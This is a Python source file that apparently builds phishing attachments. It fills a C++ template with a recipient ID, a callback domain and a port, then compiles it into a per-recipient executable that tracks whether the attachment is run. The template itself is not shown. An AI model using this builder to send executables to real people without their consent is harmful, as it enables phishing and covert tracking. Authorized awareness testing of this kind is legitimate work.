import subprocess
import os
from log import log
def compile_and_run_cpp(domain_name, port, user_id, cpp_template_path, output_executable_path):
    log(f"Compilation started...", "INFO")
    try:
        with open(cpp_template_path, 'r', encoding="utf-8") as f:
            cpp_code_template = f.read()
    except FileNotFoundError:
        log(f"File not found {cpp_template_path}", "ERROR")
        return None

    # Заменяем плейсхолдер на фактический user_id
    cpp_code = cpp_code_template.replace("{{USER_ID}}", str(user_id)).replace("{{DOMAIN_NAME}}", domain_name).replace("{{PORT}}", port)

    # Создаем временный файл для C++ кода
    temp_cpp_file = "temp.cpp"  # Лучше использовать tempfile.NamedTemporaryFile
    with open(temp_cpp_file, 'w') as f:
        f.write(cpp_code)

    # Компиляция C++ кода
    compile_command = ["g++", temp_cpp_file, "-o", output_executable_path, "-lws2_32"] 
    compile_process = subprocess.run(compile_command, capture_output=True, text=True)

    if compile_process.returncode != 0:
        log(f"Compilation error:\n{compile_process.stderr}")
        #os.remove(temp_cpp_file) # Удаляем временный файл
        return None

    # Запуск скомпилированного файла
    run_process = subprocess.run([output_executable_path], capture_output=True, text=True)

    #os.remove(temp_cpp_file) # Удаляем временный файл
    return run_process.stdout, run_process.stderr, run_process.returncode
    
def generate_payloads(domain_name, port, recipient, target_payload):
    if target_payload.name == "executable_file_runned":
        log(f"Using template {target_payload.template}", "INFO")
        
        compile_and_run_cpp(domain_name, port, recipient.id, target_payload.template, target_payload.attachment_path)
        log(f"Compilation successful...", "INFO")
        # print(f"stdout:\n{stdout}")
        # print(f"stderr:\n{stderr}")
        # print(f"Return Code: {return_code}")

    return